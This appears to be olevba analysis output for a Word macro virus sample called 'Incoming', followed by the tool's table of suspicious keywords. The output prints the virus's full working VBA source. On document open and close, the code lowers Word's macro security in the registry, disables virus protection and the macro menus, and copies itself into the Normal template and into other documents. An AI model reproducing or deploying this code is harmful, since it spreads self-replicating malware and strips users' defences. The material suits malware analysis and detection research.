olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Incoming
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Incoming.cls 
in file: ./Virus.MSWord.Incoming - OLE stream: 'Macros/VBA/Incoming'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
 On Error Resume Next
 Set a = NormalTemplate.VBProject.VBComponents(1): Set ab = a.CodeModule
 yup = Word.ActiveDocument.Characters.Count: s = "'" + Str(yup)
 ab.replaceline 27, s
End Sub
Private Sub Document_Close()
 On Error Resume Next
 If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then: CommandBars("Macro").Controls("Security...").Enabled = 0: System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
 Options.ConfirmConversions = 0
 Options.SaveNormalPrompt = 0
 Options.VirusProtection = 0
 CommandBars("Tools").Controls("Macro").Enabled = 0
 Set d = New DataObject
 Set a = NormalTemplate.VBProject.VBComponents(1): Set ab = a.CodeModule
 Set c = ActiveDocument.VBProject.VBComponents(1): Set cd = c.CodeModule
 d.SetText Incoming.VBProject.VBComponents(1).CodeModule.lines(1, Incoming.VBProject.VBComponents(1).CodeModule.countoflines)
 If Not a.Name = "Incoming" Then
   ab.deletelines 1, ab.countoflines: ab.insertlines 1, d.GetText: a.Name = "Incoming"
  ElseIf Not c.Name = "Incoming" Then
   cd.deletelines 1, cd.countoflines: cd.insertlines 1, d.GetText: c.Name = "Incoming"
  If Day(Now) = 16 Then: MsgBox "Chaos," & vbCr & "Panic," & vbCr & "Disorder," & vbCr & "My work here is done!!", vbOKOnly, "Incoming"
 End If
 yup = Word.ActiveDocument.Characters.Count: s2 = "'" + Str(yup)
 If ab.lines(27, 1) = s2 Then: ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub
' 1236
' Word 97/2K Incoming [ Psyclone X /DVC ]
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

